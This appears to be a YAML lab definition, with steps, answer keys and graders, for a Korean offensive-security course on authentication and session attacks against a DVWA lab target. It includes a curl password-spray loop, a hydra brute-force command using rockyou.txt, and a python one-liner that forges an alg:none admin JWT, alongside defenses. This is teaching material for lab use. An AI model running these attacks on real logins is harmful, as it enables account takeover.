@@ -1,0 +1,251 @@
+lab_id: standalone-attack-adv-week05
+title: "인증·세션 공격 — 자격증명·토큰·세션을 뚫는다"
+version: standalone-attack-adv
+course: attack-adv
+week: 5
+description: |
+  공격 고급 W05 — 인증·세션 공격. 신원 통제(인증)를 직접 노린다. 자격증명 공격(브루트포스·패스워드 스프레이·
+  스터핑), JWT 토큰 위조(alg:none·약한 시크릿), 세션 관리 결함(고정·예측). el34-attacker(hydra·python3)에서
+  인가 표적(el34-web 로그인)에. ⚠️ 인가된 실습만. 외부 시스템 금지.
+difficulty: hard
+duration_minutes: 180
+prerequisites:
+  - "attack-adv W01~W04 + 웹 인증 기초"
+  - "el34 호스트 SSH + docker exec, el34-attacker"
+  - "lecture §2(자격 공격) §3(JWT) §4(세션) 숙지"
+objectives:
+  - "자격증명 공격(브루트포스·스프레이·스터핑) 분류·실행"
+  - "JWT 구조와 alg:none·약한 시크릿 위조 이해"
+  - "세션 결함(고정·예측)과 인증 방어(MFA·잠금) 이해"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 목표 — 인증 표적·도구 확인
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "command -v hydra python3 >/dev/null && echo tools_ok; curl -s -i -H 'Host: dvwa.el34.lab' http://10.20.30.1/login.php 2>/dev/null | grep -ic 'set-cookie'"; echo auth_ready
+      ```
+      ## ✅ 합격 기준
+      도구·로그인 표적(세션 쿠키)이 확인되면(auth_ready) 통과.
+    hint: '인증 표적'
+    category: survey
+    points: 10
+    answer: |
+      echo "=== 인증 표적·도구 확인 ==="
+      docker exec el34-attacker sh -c "command -v hydra python3 >/dev/null && echo tools_ok; curl -s -i -H 'Host: dvwa.el34.lab' http://10.20.30.1/login.php 2>/dev/null | grep -ic 'set-cookie'"; echo auth_ready
+      echo "→ hydra(자격 공격)+python3(토큰)+로그인(PHPSESSID 세션). 인증을 직접 노린다"
+    answer_detail: "인증 표적 = 로그인 폼(세션 쿠키 발급)+hydra/python3. 인증은 모든 접근통제의 관문."
+    verify:
+      type: output_contains
+      expect: 'auth_ready'
+      field: stdout
+      semantic: {intent: "인증 표적", success_criteria: ["도구/로그인"], acceptable_methods: ["**[OSS] hydra (권장)**"]}
+    target_vm: web
+
+  - order: 2
+    instruction: |
+      ## 🎯 자격증명 공격 분류
+      ## 💻 실행 명령
+      ```bash
+      echo "브루트포스(한 계정·많은 비번)·스프레이(많은 계정·흔한 비번)·스터핑(유출 자격)·기본자격"
+      ```
+      ## ✅ 합격 기준
+      자격증명 공격 유형이 분류되면 통과.
+      ## 🔧 도구 풀이
+      - 브루트포스: 잠금에 걸림. 스프레이: 잠금 회피(계정당 1~2회). 스터핑: 재사용 비번 악용.
+    hint: '자격 공격 분류'
+    category: manipulation
+    points: 12
+    answer: |
+      echo "=== 자격증명 공격 분류 ==="
+      echo "1) 브루트포스: 한 계정에 많은 비밀번호 → 계정 잠금에 걸리기 쉬움"
+      echo "2) 패스워드 스프레이: 많은 계정에 흔한 비번 1~2개 → 잠금 회피(low-and-slow)"
+      echo "3) 크리덴셜 스터핑: 다른 사이트 유출 자격 재사용 → 비번 재사용 악용"
+      echo "4) 기본 자격: admin/admin 등 변경 안 한 기본값"
+      echo "→ 표적의 잠금 정책에 따라 기법 선택. 스프레이가 탐지 회피에 유리"
+      echo "cred_classified"
+    answer_detail: "자격 공격 = 브루트포스/스프레이/스터핑/기본자격. 잠금 정책에 따라 선택. 스프레이가 탐지 회피적."
+    verify:
+      type: output_contains
+      expect: 'cred_classified'
+      field: stdout
+      semantic: {intent: "자격 공격 분류", success_criteria: ["브루트/스프레이"], acceptable_methods: ["**[설명] 분류 (권장)**"]}
+    target_vm: web
+
+  - order: 3
+    instruction: |
+      ## 🎯 패스워드 스프레이 실행
+      ## 📖 개념 한 줄
+      흔한 비밀번호 몇 개를 여러 계정에 시도한다 — 응답 차이로 성공을 판별.
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "for p in admin password 123456 letmein; do code=\$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' --data \"username=admin&password=\$p&Login=Login\" http://10.20.30.1/login.php); echo admin:\$p=\$code; done"; echo spray_done
+      ```
+      ## ✅ 합격 기준
+      스프레이가 실행되면(spray_done) 통과.
+      ## 🔧 도구 풀이
+      - 성공 판별: 응답 코드·길이·리다이렉트 차이(differential). 균일하면 실패. CSRF 토큰 있으면 우회 필요.
+    hint: '스프레이'
+    category: analysis
+    points: 14
+    answer: |
+      echo "=== 패스워드 스프레이 실행 ==="
+      docker exec el34-attacker sh -c "for p in admin password 123456 letmein; do code=\$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' --data \"username=admin&password=\$p&Login=Login\" http://10.20.30.1/login.php); echo admin:\$p=\$code; done"; echo spray_done
+      echo "→ 흔한 비번 시도. 성공은 응답 차이(코드/길이/리다이렉트)로 판별. CSRF 토큰 있으면 토큰 추출 선행"
+    answer_detail: "스프레이 실행 = 흔한 비번을 계정에 시도. 성공은 differential(응답 차이)로 판별. 잠금 회피적 기법."
+    verify:
+      type: output_contains
+      expect: 'spray_done'
+      field: stdout
+      semantic: {intent: "스프레이", success_criteria: ["자격 시도"], acceptable_methods: ["**[OSS] curl/hydra (권장)**"]}
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## 🎯 hydra 자동화
+      ## 📖 개념 한 줄
+      hydra는 자격 공격을 자동화한다 — 프로토콜·폼·실패 조건을 지정해 대량 시도.
+      ## 💻 실행 명령
+      ```bash
+      echo "hydra 구문 예: hydra -l admin -P rockyou.txt 10.20.30.1 http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect'"
+      docker exec el34-attacker sh -c "hydra -h 2>&1 | head -1"; echo hydra_done
+      ```
+      ## ✅ 합격 기준
+      hydra 자동화 구문이 정리되면(hydra_done) 통과.
+      ## 🔧 도구 풀이
+      - -l/-L(사용자)·-p/-P(비번)·http-post-form·F=실패문자열. 실패 조건을 정확히 줘야 성공 판별.
+    hint: 'hydra'
+    category: analysis
+    points: 12
+    answer: |
+      echo "=== hydra 자동화 ==="
+      echo "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.30.1 \\"
+      echo "  http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect'"
+      docker exec el34-attacker sh -c "hydra -h 2>&1 | head -1"; echo hydra_done
+      echo "→ -l/-L(사용자)·-P(비번 목록)·http-post-form·F=실패문자열. 대량 자동 시도. CSRF 있으면 http-form의 토큰 처리 필요"
+    answer_detail: "hydra = 자격 공격 자동화(프로토콜·폼·실패조건). 대량 시도. 정확한 실패 판별이 핵심."
+    verify:
+      type: output_contains
+      expect: 'hydra_done'
+      field: stdout
+      semantic: {intent: "hydra", success_criteria: ["자동화 구문"], acceptable_methods: ["**[OSS] hydra (권장)**"]}
+    target_vm: web
+
+  - order: 5
+    instruction: |
+      ## 🎯 JWT 토큰 공격 (alg:none 위조)
+      ## 📖 개념 한 줄
+      JWT는 서명으로 무결성을 보장하는데, alg:none을 받아주면 서명 없이 토큰을 위조할 수 있다.
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "python3 -c \"import base64,json; b=lambda d: base64.urlsafe_b64encode(d).decode().rstrip('='); h=b(json.dumps({'alg':'none','typ':'JWT'}).encode()); p=b(json.dumps({'user':'admin','role':'admin'}).encode()); print('forged='+h+'.'+p+'.')\""; echo jwt_done
+      ```
+      ## ✅ 합격 기준
+      alg:none JWT 위조가 시연되면(jwt_done) 통과.
+      ## 🔧 도구 풀이
+      - JWT=header.payload.signature(base64url). alg:none이면 서명 비검증 → role:admin 위조. 약한 시크릿은 hashcat 크랙.
+    hint: 'JWT'
+    category: analysis
+    points: 14
+    answer: |
+      echo "=== JWT 토큰 공격(alg:none 위조) ==="
+      docker exec el34-attacker sh -c "python3 -c \"import base64,json; b=lambda d: base64.urlsafe_b64encode(d).decode().rstrip('='); h=b(json.dumps({'alg':'none','typ':'JWT'}).encode()); p=b(json.dumps({'user':'admin','role':'admin'}).encode()); print('forged='+h+'.'+p+'.')\""; echo jwt_done
+      echo "→ alg:none 위조 JWT(role:admin, 서명 없음). 서버가 alg:none 수락 시 인증 우회. 약한 시크릿은 hashcat 크랙"
+    answer_detail: "JWT 공격 = alg:none(서명 비검증)으로 role:admin 위조. 약한 시크릿 크랙. 방어는 alg 고정·강한 시크릿."
+    verify:
+      type: output_contains
+      expect: 'jwt_done'
+      field: stdout
+      semantic: {intent: "JWT", success_criteria: ["alg:none 위조"], acceptable_methods: ["**[OSS] python3 JWT (권장)**"]}
+    target_vm: web
+
+  - order: 6
+    instruction: |
+      ## 🎯 세션 관리 결함
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "echo session1:; curl -s -i -H 'Host: dvwa.el34.lab' http://10.20.30.1/login.php 2>/dev/null | grep -i 'set-cookie: PHPSESSID' | head -1"; echo session_done
+      ```
+      ## ✅ 합격 기준
+      세션 토큰 관찰·결함 유형이 정리되면(session_done) 통과.
+      ## 🔧 도구 풀이
+      - 세션 결함: 고정(fixation)·예측 가능 토큰·미만료·미재발급(로그인 후). Secure/HttpOnly 부재.
+    hint: '세션 결함'
+    category: report
+    points: 12
+    answer: |
+      echo "=== 세션 관리 결함 ==="
+      docker exec el34-attacker sh -c "echo PHPSESSID 관찰:; curl -s -i -H 'Host: dvwa.el34.lab' http://10.20.30.1/login.php 2>/dev/null | grep -i 'set-cookie' | head -2"; echo session_done
+      echo "결함 유형:"
+      echo "  - 세션 고정(fixation): 로그인 후 세션 미재발급 → 공격자가 심은 세션 탈취"
+      echo "  - 예측 가능 토큰: 순차/약한 난수 → 추측"
+      echo "  - 미만료·HttpOnly/Secure 부재 → 탈취·재사용"
+      echo "→ 세션은 인증 후의 '신원 증표'. 약하면 인증을 통째로 우회"
+    answer_detail: "세션 결함 = 고정/예측가능/미만료/플래그부재. 인증 후 신원 증표가 약하면 인증 우회. 재발급·강한 난수 필요."
+    verify:
+      type: output_contains
+      expect: 'session_done'
+      field: stdout
+      semantic: {intent: "세션 결함", success_criteria: ["고정/예측"], acceptable_methods: ["**[OSS] 세션 분석 (권장)**"]}
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## 🎯 방어 — 인증·세션 강화
+      ## 💻 실행 명령
+      ```bash
+      echo "방어: MFA·계정잠금/rate-limit·강한 해시(bcrypt)·세션 재발급·alg 고정·Secure/HttpOnly"
+      ```
+      ## ✅ 합격 기준
+      인증·세션 방어가 정리되면 통과.
+    hint: '방어'
+    category: report
+    points: 12
+    answer: |
+      echo "=== 방어: 인증·세션 강화 ==="
+      echo "자격 공격: ① MFA(가장 효과적) ② 계정 잠금/rate-limit ③ 강한 비번 정책 ④ 유출 자격 모니터링"
+      echo "저장: bcrypt/argon2 해시(평문·MD5 금지) + salt"
+      echo "JWT: alg 화이트리스트(none 거부)·강한 시크릿·짧은 만료·서명 검증 필수"
+      echo "세션: 로그인 후 재발급·강한 난수·만료·Secure/HttpOnly/SameSite"
+      echo "→ 탐지: 다수 실패(soc W06 brute 룰)·스프레이 패턴·비정상 위치"
+      echo "defense_done"
+    answer_detail: "방어 = MFA/잠금/강한해시/세션재발급/JWT alg고정. MFA가 자격 공격에 가장 효과적. 탐지와 병행."
+    verify:
+      type: output_contains
+      expect: 'defense_done'
+      field: stdout
+      semantic: {intent: "방어", success_criteria: ["MFA/잠금"], acceptable_methods: ["**[관리적] 방어 (권장)**"]}
+    target_vm: web
+
+  - order: 8
+    instruction: |
+      ## 🎯 인증 공격 보고서
+      ## 💻 보고서 양식
+      ```markdown
+      # 공격고급 W05 인증·세션 공격 보고서 (학번, 이름)
+      ## 1. 자격 공격(분류·스프레이·hydra)
+      ## 2. JWT 위조·세션 결함
+      ## 3. 방어(MFA·세션·JWT)
+      ```
+      ## ✅ 합격 기준
+      자격공격 + JWT/세션 + 방어 포함.
+    hint: '자격+JWT/세션+방어'
+    category: report
+    points: 14
+    answer: |
+      cat <<'EOF'
+      # 공격고급 W05 인증·세션 공격 보고서
+      ## 1. 자격 공격: 분류(브루트/스프레이/스터핑). 스프레이 실행(응답 차이로 판별)·hydra 자동화(http-post-form)
+      ## 2. JWT: alg:none으로 role:admin 위조(서명 비검증 시 인증 우회). 세션: 고정·예측가능·미재발급 결함
+      ## 3. 방어: MFA·계정잠금/rate-limit·bcrypt·JWT alg 고정·세션 재발급·Secure/HttpOnly. 탐지(다수 실패 룰)
+      ## 결론: 인증은 모든 접근통제의 관문. 자격·토큰·세션 어느 하나라도 약하면 전체 우회 — MFA가 최선의 방어
+      EOF
+    answer_detail: "인증 공격 보고 = 자격공격/스프레이/hydra+JWT/세션+방어(MFA). 인증의 약한 고리가 전체를 무너뜨림."
+    verify:
+      type: output_contains
+      expect: '인증'
+      field: stdout
+      semantic: {intent: "인증 공격 보고", success_criteria: ["자격/JWT/방어"], acceptable_methods: ["**[관리적] 보고서 (권장)**"]}
+    target_vm: web
